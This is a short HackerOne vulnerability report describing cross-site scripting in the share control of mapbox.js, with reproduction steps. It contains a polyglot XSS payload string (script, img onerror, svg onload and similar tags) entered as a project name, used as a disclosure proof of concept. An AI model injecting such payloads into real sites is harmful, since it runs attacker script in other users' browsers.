# HackerOne Report: XSS in L.mapbox.shareControl in mapbox.js
**Report ID:** 99245
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Hi Mapbox

I've found a xss vulnerability on mapbox sharing system.

I've a project called with "'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"

than click it and copy the share URL and go to URL

than click the the marked area than you will see the vulnerability



## Discussion & Remediation Timeline
